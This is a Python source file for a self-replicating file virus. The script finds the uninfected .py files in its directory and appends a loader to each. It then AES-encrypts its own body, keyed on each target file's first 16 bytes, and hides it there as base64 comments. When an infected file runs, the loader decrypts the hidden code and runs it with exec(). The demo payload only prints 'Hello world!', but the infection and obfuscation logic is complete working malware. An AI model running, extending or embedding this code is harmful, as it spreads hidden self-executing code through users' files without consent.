from os import listdir,path
from tkinter import E
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from sys import exit
from base64 import b64encode
import __main__
#start

def encrypt(key, body):
    #key = bytes(cur_file.readline(AES.block_size), 'ascii')
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(bytes(body,'ascii'), AES.block_size))
    return iv+ciphertext


def get_all_content(cur_file):
    file = open(cur_file, "r")
    lines = file.readlines()
    file.close()
    return lines


def get_body_content(file, start, end):
    all_lines = get_all_content(file)
    body_lines = ""
    append = False
    for line in all_lines:
        if(line.strip() == end):
            body_lines += line
            break
        elif(append == True):
            body_lines += line
        elif(line.strip() == start):
            body_lines += line
            append = True
    print('These are the body lines: \n', body_lines)
    return body_lines
        

def get_unencrypted_content():
    cur_file = open(__file__)
    all_lines = cur_file.readlines()
    copy = False
    content = '\n'
    for line in all_lines:
        if line.strip() == '#start pay':
            copy = False
            break

        elif line.strip() == '#the real script starts here!':
            copy = True
            content += '\n'
            content += line

        elif copy:
            content += line
    
    return content
        
def inject(files, body):
    for file in files:
        file_opened = open(file, 'r')
        #file_opened.seek(0,2)
        line = file_opened.readline(AES.block_size)
        file_opened.close()
        file_opened = open(file, "a")
        print(file_opened, line, len(line))
        #take first 16 bytes of the file and encrypt the payload using that
        key = bytes(line, 'ascii')
        try:
            ciphertext = encrypt(key, body)
            file_opened.write('#start pay\n')
            file_opened.write('#' + b64encode(ciphertext).decode('ascii')+ '\n')
            file_opened.write('#end pay')
        except:
            print('It did not happen.')       
        file_opened.close()

    return

def inject_unencrypted(files, body):
    for file in files:
        file_opened = open(file, 'a')
        file_opened.seek(0,2)
        #take first 16 bytes of the file and encrypt the payload using that
        file_opened.write(body)  
        file_opened.close()
    return

def get_non_infected_files_in_cur_dir(start):
    all_files = listdir()
    all_py_files = []
    for file in all_files:
        if(file.endswith('.py') and  not is_infected(file,start)):
            all_py_files.append(file)
    cur_file = str(path.basename(__file__))
    try:
        all_py_files.remove(cur_file)
    except:
        pass
    return all_py_files


def is_infected(file, start):
    f = open(file, "r")
    lines = f.readlines()
    for line in lines:
        if(line.strip() == start):
            return True
    return False


def payload():
    print('Hello world!')

files = get_non_infected_files_in_cur_dir('#the real script starts here!')
print(files)
print(__main__.__file__)
print(get_body_content(__main__.__file__, '#start', '#end'))
unencrypted_content = get_unencrypted_content()
inject_unencrypted(files, unencrypted_content)
inject(files, get_body_content(__main__.__file__, '#start', '#end'))
payload()
#end


#the real script starts here!
from os import listdir,path
from tkinter import E
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from sys import exit
from base64 import b64encode, b64decode
import __main__

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    ciphertext = ciphertext[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext.decode('ascii')


#get the payload and run it

cur_file = open(__file__)
all_lines = cur_file.readlines()
ciphertext = ""
copy = False

for line in all_lines:
    if line.strip() == '#end pay':
        copy = False
        break
    elif line.strip() == '#start pay':
        copy = True
    elif copy:
        ciphertext += line.strip()


try:
    cur_file.seek(0)
    key = bytes(cur_file.readline(AES.block_size), 'ascii')
    plaintext = decrypt(b64decode(ciphertext) , key)
    print(plaintext)
    while(plaintext[len(plaintext)-1] != 'd'):
        plaintext = plaintext[:len(plaintext)-1]
    print(plaintext)
    cur_file.close()
    cur_file = open(__file__, 'a')
    cur_file.write('\n')
    cur_file.write(plaintext)
    cur_file.close()
    exec(plaintext)
    exit()
except:
    pass

        
#start pay

#end pay